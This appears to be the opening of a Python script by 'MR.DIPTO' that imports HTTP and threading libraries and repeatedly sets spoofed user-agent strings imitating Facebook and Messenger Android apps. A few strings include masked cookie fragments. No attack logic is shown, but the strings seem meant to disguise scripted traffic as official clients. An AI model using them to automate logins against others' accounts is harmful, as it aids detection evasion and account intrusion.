#WRITTEN BY MR.DIPTO
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random,json
import httpx
import json
import sys
#-----------------#
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1 Cookie VaHe******************** Edit'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930F Build/NRD90M) [FBAN/Orca-Android;FBAV/247.0.0.10.117'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1'
ua = 'Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;] Cookie yQHE********************'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;] FBBK/1\]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] FBBK/'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;] FBBK/1'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};] Soubor cookie SryV********************'
ua = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
ua = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
ua = 'Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
ua = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'
ua = 'Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;] FBBK/1CookieqstJ'
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;] FBBK/1CookieqstJ'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;'
ua = 'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]'
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
